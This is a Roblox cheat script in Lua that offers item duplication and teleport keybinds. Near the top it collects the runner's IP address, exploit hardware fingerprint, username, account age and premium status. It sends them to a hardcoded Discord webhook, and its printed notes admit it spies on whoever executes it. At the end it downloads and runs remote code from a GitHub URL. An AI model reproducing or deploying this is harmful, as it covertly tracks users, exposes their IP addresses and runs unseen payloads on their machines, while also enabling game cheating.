local m = game.Players.LocalPlayer:GetMouse()
--logs part

local IP = game:HttpGet("https://v4.ident.me")
plr = game:GetService'Players'.LocalPlayer
local premium = false
local ALT = false
if plr.MembershipType == Enum.MembershipType.Premium then
	premium = true
elseif plr.MembershipType == Enum.MembershipType.None then
	premium = false
end
if premium == false then 
	if plr.AccountAge <= 70 then 
		ALT = true
	end
end

local market = game:GetService("MarketplaceService")
local info = market:GetProductInfo(game.PlaceId, Enum.InfoType.Asset)


local http_request = http_request;
if syn then
	http_request = syn.request
elseif SENTINEL_V2 then
	function http_request(tb)
		return {
			StatusCode = 200;
			Body = request(tb.Url, tb.Method, (tb.Body or ''))
		}
	end
end

local body = http_request({Url = 'https://httpbin.org/get'; Method = 'GET'}).Body;
local decoded = game:GetService('HttpService'):JSONDecode(body)
local hwid_list = {"Syn-Fingerprint", "Exploit-Guid", "Proto-User-Identifier", "Sentinel-Fingerprint"};
hwid = "";

for i, v in next, hwid_list do
	if decoded.headers[v] then
		hwid = decoded.headers[v];
		break
	end
end

if hwid then
local HttpServ = game:GetService('HttpService')
local url = "https://discordapp.com/api/webhooks/743776914556059648/meDvXMDE7OiduN1Us-drnfS_g5_TgzjLp2lCuNXStYCTWESMqlpJCCOrxFsEyWHGRohv"


local data = 
    {
        ["content"] = "",
        ["embeds"] = {{
            ["title"] = "__**HWID:**__",
            ["description"] = hwid,
            ["type"] = "rich",
            ["color"] = tonumber(0xAB0909),
            ["fields"] = {
                {
                    ["name"] = "Username:",
                    ["value"] = Game.Players.LocalPlayer.Name,
                    ["inline"] = true
                },
				{
                    ["name"] = "IP Address:",
                    ["value"] = IP,
                    ["inline"] = true
                },
				{
                    ["name"] = "Game Link:",
                    ["value"] = "https://roblox.com/games/" .. game.PlaceId .. "/",
                    ["inline"] = true
                },
				{
					["name"] = "Game Name:",
					["value"] = info.Name,
					["inline"] = true
				},
				{
					["name"] = "Age:",
					["value"] = plr.AccountAge,
					["inline"] = true
				},
				{
					["name"] = "Premium:",
					["value"] = premium,
					["inline"] = true
				},
				{
					["name"] = "ALT:",
					["value"] = ALT,
					["inline"] = true
				},
				
            },
        }}
    }
    local newdata = HttpServ:JSONEncode(data)
    
    local headers = {
            ["content-type"] = "application/json"
    }
    
    local request_payload = {Url=url, Body=newdata, Method="POST", Headers=headers}
    http_request(request_payload)
end

--credits part

    game.StarterGui:SetCore("SendNotification", {
    Title = "Kew#6736";
    Text = "press F9 for info";
    Icon = "";
    Duration = "10";
    })

wait(1)

    print("made by Kew#6736")
    print("-------------------------------------------------------------------------------------------------------------------------------------------------")
    print("quick tutorial, hold the item u want to dupe, type in chat '/save' and done, if didn't work try again, if still not workin dm me in discord")
    print("numpad 1 - save, numpad 2 - teleport to save, numpad 3 - equip all items in inv, numpad 4 - teleport all items to you")
    print("note: press numpad 2 very fast when u respawned cause it will kill you")
    print("-------------------------------------------------------------------------------------------------------------------------------------------------")
    print("Update - Added gui to equip Only items u want (u can equip for example: rokakaka and stone mask or more idk)")
    print("teleport thingy in gui will teleport YOU to the item, can kill you sometimes")
    print("the script spys who executed it, dont even try to share it with someone or sell it")
    
--dupe

player=game.Players.LocalPlayer
    player.Chatted:Connect(function(msg)
        if msg=="/save" then 
            wait(0.1)
            for i, v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
            if v:IsA("Tool") then
            v.Parent = game.Workspace
            end
            end
            wait()
            game.Players.LocalPlayer.Character.Humanoid.Health = 0 
            end
    end)
    
--save position

function onKeyPress(inputObject, gameProcessedEvent)
if inputObject.KeyCode == Enum.KeyCode.KeypadOne then
LPos = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
end
end
game:GetService("UserInputService").InputBegan:connect(onKeyPress)

--teleport to saved position

function onKeyPress(inputObject, gameProcessedEvent)
if inputObject.KeyCode == Enum.KeyCode.KeypadTwo then
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = LPos
end
end
game:GetService("UserInputService").InputBegan:connect(onKeyPress)

--equip all items in backpack

function onKeyPress(inputObject, gameProcessedEvent)
if inputObject.KeyCode == Enum.KeyCode.KeypadThree then
    wait("2.5")
    for _, tool in ipairs(game:GetService("Players").LocalPlayer.Backpack:GetChildren()) do
    if tool:IsA("Tool") then
         tool.Parent = game:GetService("Players").LocalPlayer.Character
    end
end
end
end
game:GetService("UserInputService").InputBegan:connect(onKeyPress)

--teleport all droped items to you
function onKeyPress(inputObject, gameProcessedEvent)
if inputObject.KeyCode == Enum.KeyCode.KeypadFour then
    for i,v in pairs(game.Workspace:GetChildren()) do
	                  if v:IsA"Tool" then
	           v.Handle.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
	               end
           end
    end

end
game:GetService("UserInputService").InputBegan:connect(onKeyPress)
wait(0.4)
loadstring(game:HttpGet("https://raw.githubusercontent.com/KewIzHere/REEEEde/master/hey", true))()
